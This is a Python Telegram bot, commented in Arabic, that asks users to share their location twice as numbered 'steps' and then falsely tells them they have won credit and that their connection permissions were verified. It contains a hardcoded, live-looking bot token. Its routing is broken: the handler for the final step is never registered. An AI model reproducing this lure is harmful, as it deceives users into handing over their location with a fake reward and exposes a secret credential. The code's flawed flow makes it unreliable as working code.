import logging
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# إعداد السجلات لمتابعة عمل البوت
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)

# توكن البوت الخاص بك
TOKEN = "8690867763:AAHZLpFhevbDCz5Rg8eoZjY5VVkFPGTKg8M"

# 1. أمر البدء (الخطوة الأولى): يرحب بالمستخدم ويطلب منه مشاركة الموقع والسماح
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    location_button = KeyboardButton(text="📍 البدء - مشاركة الموقع والسماح", request_location=True)
    reply_markup = ReplyKeyboardMarkup([[location_button]], resize_keyboard=True, one_time_keyboard=True)
    
    await update.message.reply_text(
        "أهلاً بك في الخطوة الأولى!\n"
        "للبدء والمتابعة، يرجى السماح للبوت بالوصول إلى موقعك الجغرافي عبر الضغط على الزر أدناه 👇",
        reply_markup=reply_markup
    )

# 2. الخطوة الثانية: استقبال الموقع الأول ثم طلب تأكيد الموقع مرة أخرى
async def second_step(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.location:
        location_button = KeyboardButton(text="📍 الخطوة الثانية - تأكيد مشاركة الموقع", request_location=True)
        reply_markup = ReplyKeyboardMarkup([[location_button]], resize_keyboard=True, one_time_keyboard=True)
        
        await update.message.reply_text(
            "تم استلام موقعك للخطوة الأولى بنجاح ✅\n\n"
            "الانتقال إلى **الخطوة الثانية**:\n"
            "يرجى الضغط على الزر أدناه لتأكيد الموقع والسماح للمتابعة إلى المرحلة الأخيرة 👇",
            reply_markup=reply_markup
        )
    else:
        await update.message.reply_text("الرجاء إرسال الموقع باستخدام الزر المخصص.")

# 3. الخطوة الثالثة: مرحلة الربح وإتمام العملية
async def third_step(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.location:
        await update.message.reply_text(
            "🎉 **الخطوة الثالثة: الربح**\n\n"
            "تهانينا! تم التحقق من الموقع وصلاحيات الاتصال بنجاح.\n"
            "لقد ربحت رصيداً جديداً معنا! تابع المزيد من العروض عبر بوتنا."
        )
    else:
        await update.message.reply_text("الرجاء تأكيد الموقع عبر الزر السابق أولاً.")

# موجه ذكي للتعامل مع مواقع المستخدم حسب المرحلة
async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # تحقق بسيط لمعرفة ما إذا كان المستخدم في الخطوة الثانية وانتقل للثالثة
    text = update.message.text if update.message.text else ""
    if update.message.location:
        # إذا أرسل موقعاً للمرة الثانية ننقله للخطوة الثالثة (الربح)
        await third_step(update, context)

def main():
    app = ApplicationBuilder().token(TOKEN).build()

    # أمر البدء (الخطوة الأولى)
    app.add_handler(CommandHandler("start", start_command))
    
    # معالجة استلام الموقع الأول لنقله للخطوة الثانية
    app.add_handler(MessageHandler(filters.LOCATION & ~filters.UpdateType.EDITED, second_step))

    app.run_polling()

if __name__ == "__main__":
    main()
